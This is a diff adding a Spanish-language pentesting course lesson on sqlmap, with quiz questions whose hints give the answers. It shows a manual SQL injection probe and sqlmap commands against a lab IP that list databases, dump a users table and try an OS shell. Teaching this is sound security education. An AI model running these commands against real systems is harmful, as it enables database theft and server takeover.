@@ -1,0 +1,55 @@
+---
+index: 3
+title: "sqlmap: inyección SQL automatizada"
+questions:
+  - id: herramientas-ofensivas-t03-q01
+    prompt: "¿Qué opción de sqlmap vuelca (dump) los datos de una tabla concreta?"
+    hint: "--dump con -D base -T tabla."
+    kind: text
+  - id: herramientas-ofensivas-t03-q02
+    prompt: "¿Qué flag de sqlmap intenta obtener una shell SQL (--os-...)?"
+    hint: "Sistema operativo."
+    kind: text
+  - id: herramientas-ofensivas-t03-q03
+    prompt: "Antes de automatizar SQLi con sqlmap, ¿qué conviene hacer SIEMPRE?"
+    hint: "Entender el parámetro vulnerable manualmente primero."
+    kind: choice
+    options:
+      - id: a
+        label: "Nada: sqlmap lo encuentra todo solo"
+      - id: b
+        label: "Confirmar la inyección a mano (comilla, error) y delimitar el parámetro"
+      - id: c
+        label: "Subir un antivirus"
+      - id: d
+        label: "Reiniciar el servidor"
+---
+
+## Del error 500 a la base de datos completa
+
+Ya sabes detectar SQLi a mano (`' OR 1=1--`). **sqlmap** automatiza la explotación
+completa: enumera bases, tablas, columnas y vuelca datos.
+
+```bash
+# Parámetro vulnerable en la URL (nota la comilla final del parámetro id=1)
+sqlmap -u "http://10.10.10.5/producto?id=1" --batch
+
+# Pasos progresivos
+sqlmap -u URL --dbs                 # listar bases
+sqlmap -u URL -D tienda --tables    # tablas de una base
+sqlmap -u URL -D tienda -T users --dump   # ¡datos!
+sqlmap -u URL --os-shell            # intentar shell del SO (máximo daño)
+```
+
+Con `--batch` responde las preguntas con defaults (útil en labs).
+
+## El orden importa
+
+En un pentest real: (1) encuentras el punto de inyección A MANO con Burp, (2) entiendes
+qué parámetro y qué contexto, (3) SOLO entonces automatizas. sqlmap a ciegas contra
+toda una web genera ruido, puede tumbar la app y te pierdes hallazgos que la lógica
+manual descubre.
+
+La inyección SQL se explica a fondo en el módulo OWASP Top 10 y en el path Jr
+Pentester — con laboratorios dedicados. Aquí te quedas con el mapa: entrada sin
+validar → consulta manipulada → base de datos comprometida.
